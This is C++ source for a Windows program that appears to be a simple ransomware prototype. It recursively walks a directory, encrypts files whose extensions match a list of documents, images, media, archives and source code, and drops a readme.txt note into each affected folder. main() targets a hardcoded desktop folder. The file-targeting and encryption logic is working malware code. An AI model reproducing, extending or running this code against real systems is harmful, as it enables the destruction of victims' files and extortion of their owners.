#include <Windows.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>  
#include "Cryptor.h"

//https://stackoverflow.com/questions/25639874/recursively-searching-for-files-in-the-computer


void dropInstruction(BYTE* directory)
{
	char path[256];
	lstrcpy(path, (char *)directory);
	char* a = "nuoc noi lenh lang tran tre hai hang";
	DWORD b = strlen(a);
	lstrcat(path, "\\readme.txt");
	HANDLE hFile = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, a, b, &b, NULL);
	CloseHandle(hFile);
}



bool checkExtention(const char* ext)
{
	char *extention[] 
	{
		".doc", ".docx", ".xls", ".ppt", ".html", ".pdf", ".txt", ".xml", ".jpg", ".jpeg", ".png", ".svg", ".mp3", ".mp4", ".7z", ".rar", ".tar", ".gz", ".zip", ".h", ".cpp"
	};
	int aasd = sizeof(extention) / sizeof(LPSTR);
	for (size_t i = 0; i < aasd; i++)
		if (!lstrcmp(extention[i], ext))
			return TRUE;
	return FALSE; 
}



void encryptFiles(std::string& directory)
{
	std::string tmp = directory + "\\*";
	WIN32_FIND_DATA file;
	HANDLE search_handle = FindFirstFileA(tmp.c_str(), &file);
	if (search_handle != INVALID_HANDLE_VALUE)
	{
		std::vector<std::string> directories;
		do
		{
			if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if ((!lstrcmp(file.cFileName, ".")) || (!lstrcmp(file.cFileName, "..")))
					continue;
			}

			tmp = directory + "\\" + std::string(file.cFileName);
			std::string extention = PathFindExtension(tmp.c_str());
			if (checkExtention(extention.c_str()) && strcmp(file.cFileName, "readme.txt"))
			{
				dropInstruction((BYTE *)directory.c_str());
				cryptor::Encrypt((BYTE *)tmp.c_str());
			}
			if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				directories.push_back(tmp);
		} while (FindNextFile(search_handle, &file));

		FindClose(search_handle);

		for (std::vector<std::string>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
			encryptFiles(*iter);
	}
}
/*
int main()
{
	std::wofstream file_stream;
	file_stream.open("sample.txt");
	FindFile(L"C:\\Windows", file_stream);
	file_stream.close();
	return 0;
}

*/

int main()
{
	void* dcmthai = calloc(MAX_PATH, 1);
	memcpy(dcmthai, "C:\\Users\\nha\\Desktop\\asdasd", strlen("C:\\Users\\nha\\Desktop\\asdasd"));
	encryptFiles(std::string((char *)dcmthai));
	free(dcmthai);
	return 0;

}